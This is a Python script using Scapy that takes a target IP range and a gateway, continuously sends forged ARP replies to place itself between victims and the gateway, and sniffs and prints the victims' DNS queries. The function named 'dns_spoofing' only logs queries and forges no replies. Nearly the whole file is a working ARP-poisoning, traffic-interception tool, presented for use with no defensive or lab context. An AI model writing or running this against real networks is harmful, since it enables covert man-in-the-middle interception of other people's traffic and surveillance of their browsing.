#import necessary tools
import logging
from scapy.all import sniff, ARP, send
from scapy.layers.dns import DNS, DNSQR, IP
import threading
from rich import print

# Suppress Scapy runtime warnings
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

# Get network targets from user input
targetr = input(" Enter the target IP or range (e.g. 172.42.1.0/24): ")
gateway = input(" Enter the gateway IP (e.g. 172.42.1.7): ")

# Function to send spoofed ARP packets
def arp_spofing(targetr, spoofip):
    packet = ARP(op=2, pdst=targetr, hwdst='ff:ff:ff:ff:ff:ff', psrc=spoofip)
    send(packet, verbose=False)

# Function to sniff and print DNS queries
def dns_spoofing(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        IPsrc = packet[IP].src
        dnsQ = packet[DNSQR].qname.decode()
        print(IPsrc, dnsQ)

# Loop to continuously perform ARP spoofing
def arp_start(targetr, gateway):
    while True:
        arp_spofing(targetr, gateway)
        arp_spofing(gateway, targetr)

# Start ARP spoofing in a background thread
threading.Thread(target=arp_start, args=(targetr, gateway), daemon=True).start()

# Display output header
print("--------------------------[yellow]H TOOL IS RUNNING ![/yellow]-------------------------")
print(f"{'[cyan]IP ADDRESS[/cyan]  ': <15}   |   \t {'[green]DNS Query[/green]  ': <30}")
print("----------------------------------------------------------------------")

# Start sniffing DNS packets
sniff(filter='udp port 53', prn=dns_spoofing, store=False)

